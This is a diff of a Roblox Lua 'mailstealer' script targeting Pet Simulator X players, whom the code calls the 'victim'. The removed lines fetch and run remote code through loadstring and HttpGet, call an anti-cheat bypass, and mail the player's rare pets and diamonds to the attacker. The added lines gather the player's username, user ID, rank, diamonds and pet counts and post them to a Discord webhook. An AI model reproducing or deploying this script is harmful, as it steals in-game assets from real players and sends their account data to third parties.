@@ -1,75 +1,109 @@
-local UserInputService = game:GetService("UserInputService")
-UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-
-for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy()
+local Exclusive = 0
+for i,v in
+pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:
+GetChildren()) do
+ if v:IsA("TextButton") then
+ if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
+ Exclusive = Exclusive + 1
+ end
+ end
 end
-
-function sendWebhook(webhook, message)
-    local webhookcheck =
-        is_sirhurt_closure and "Sirhurt" or
-        pebc_execute and "ProtoSmasher" or
-        syn and "Synapse X" or
-        secure_load and "Sentinel" or
-        KRNL_LOADED and "Krnl" or
-        SONA_LOADED and "Sona" or
-        "Kid with shit exploit"
-
-    local url = webhook
-    local data = {
-        ["content"] = message
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {
-        Url = url,
-        Body = newdata,
-        Method = "POST",
-        Headers = headers
-    }
-    request(abcdef)
+local Event = 0
+for i,v in
+pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:
+GetChildren()) do
+ if v:IsA("TextButton") then
+ if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+ Event = Event + 1
+ end
+ end
 end
+local exploit = identifyexecutor()
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20LoadingScreen%20%E2%9C%97"))()
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20HosteeAPI%20%E2%9C%97"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Moriwebh/main/webhook"))()
-
-BypassAntiCheat()
-AreaTeleport("Shop")
-TeleportToMailbox()
-local player = game:GetService("Players").LocalPlayer
-
-local dims = player.leaderstats.Diamonds.Value - 100000
-if dims < 0 then
-    dims = 0
+--// Execution Log
+if game.PlaceId == 6284583030 then
+_G.GameIn = "Pet Simulator X"
+elseif game.PlaceId == 7722306047 then
+_G.GameIn = "PSX Trading Plaza"
+elseif game.PlaceId == 10321372166 then
+_G.GameIn = "PSX Hardcore"
+elseif game.PlaceId == 12610002282 then
+_G.GameIn = "PSX Pro Trading Plaza"
+elseif game.PlaceId == 11725212117 then
+_G.GameIn = "PSX Voice Trading Plaza"
+else
+_G.GameIn = "❓ Couldn't find game"
 end
+local webhookcolor = "16711680"
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
+_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+_G.PlrUserVictim = game.Players.LocalPlayer.Name
+_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
+_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
+_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
+local GemsFormated =
+(require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond
+))
+local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)(
+_G.DisplayRap ))
+local function sendwebhook(msg)
+local msg = {
+["avatar_url"] =
+"https://media.discordapp.net/attachments/1100881547269242951/1125186511948746933/0718fcf7db997729b90ff10323c903d9.jpg",
+["content"]= "**<:HosteeHub:1116666366959812729> || @here @everyone || "..
+_G.UserNamey .." We Got Some Good News But First, You Got A New Hit With Memento Mori!
+<:HosteeHub:1116666366959812729>** ",
+["username"] = "Memento Mori!",
+["embeds"]= {
+ {
+["title"]= "`Mori Scriptz Mailstealer Results`",
+["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069>
+Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username:
+".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID:
+".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place:
+".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
+["url"]= "https://discord.gg/",
+["color"]= ""..webhookcolor.."",
+["thumbnail"] = {
+ ["url"] =
+"https://media.discordapp.net/attachments/1100881547269242951/1125186511948746933/0718fcf7db997729b90ff10323c903d9.jpg",
+ ["height"] = 420,
+ ["width"] = 420
+ },
+["fields"]= {
+ {
+ ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810>
+**",
+ ["value"]= "```"..GemsFormated.."```",
+ ["inline"]= true
+ },
+ {
+ ["name"]= "**<:arrowup:1112767464640622686>Rap<:arrowup:1112767464640622686>**",
+ ["value"]= "```"..RapFormated.."```",
+ ["inline"]= true
+ },
+{
+ ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
+ ["value"]= "```"..Exclusive.."```",
+ ["inline"]= true
+ },
+{
+ ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
+ ["value"]= "```"..Event.."```",
+ ["inline"]= true
+ }
+ }
 
-wait(10)
-for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
-    if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
-            local args = {
-                [1] = {
-                    ["Recipient"] = _G.UserNamey,
-                    ["Diamonds"] = dims,
-                    ["Pets"] = {
-                        [1] = v.Name
-                    },
-                    ["Message"] = "Memento Mori !"
-                }
-            }
-            Networking.Invoke("Send Mail", unpack(args))
-            dims = 0
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Moriwebh/main/webhook"))()
-            wait(7)
-end
-end
-end
+ }
+ },
+["attachments"] = {}
+ }
+ local Webhook = _G.Webhook
+ request = http_request or request or HttpPost or syn.request
+ request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body =
+game.HttpService:JSONEncode(msg)})
+ end
+ sendwebhook(msg)
